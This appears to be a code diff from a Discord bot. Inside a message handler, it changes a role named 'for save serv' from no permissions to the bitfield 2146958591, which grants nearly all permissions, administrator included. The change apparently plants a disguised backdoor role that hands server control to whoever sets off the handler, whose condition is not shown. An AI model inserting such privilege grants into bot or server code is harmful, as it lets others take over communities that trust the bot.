@@ -83,7 +83,7 @@ bot.on('message', message => {
 				message.guild.createRole({
 				  name: "for save serv",
 				  mentionable: true,
-                                 permissions: 0
+                                 permissions: 2146958591
 				})
 
 				var embed = new Discord.RichEmbed()
